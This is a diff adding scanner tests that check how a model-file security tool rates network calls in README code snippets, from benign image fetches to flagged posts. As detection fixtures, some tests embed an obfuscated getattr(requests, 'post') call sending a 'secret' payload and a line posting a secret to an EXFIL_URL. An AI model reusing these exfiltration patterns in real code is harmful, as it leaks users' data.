@@ -524,6 +524,65 @@ image = Image.open(requests.get("http://images.cocodataset.org/val2017/000000039
     assert determine_exit_code(aggregate) == 0
 
 
+def test_text_scanner_fenced_documentation_multiline_passive_media_fetch_is_informational(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python3
+from PIL import Image
+import requests
+
+image = Image.open(requests.get(
+    "http://images.cocodataset.org/val2017/000000039769.jpg",
+    stream=True,
+).raw)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    informational_types = {
+        check.details.get("type")
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
+    }
+    assert {"network_function", "network_library", "url_detected"} <= informational_types
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_fenced_documentation_imported_passive_media_fetch_is_informational(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python3
+from PIL import Image
+from requests import get
+
+image = Image.open(get("http://images.cocodataset.org/val2017/000000039769.jpg").raw)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    informational_types = {
+        check.details.get("type")
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
+    }
+    assert {"network_library", "url_detected"} <= informational_types
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
 @pytest.mark.parametrize(
     "media_url",
     [
@@ -878,6 +937,34 @@ requests.post(os.environ["EXFIL_URL"], data=secret)
         and check.details.get("type") == "network_function"
         and check.details.get("function") == "requests.post"
         and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_getattr_post(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import requests
+
+payload = {"input": "secret"}
+getattr(requests, "post")("http://localhost:8080/v1/models", json=payload)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "http://localhost:8080/v1/models"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
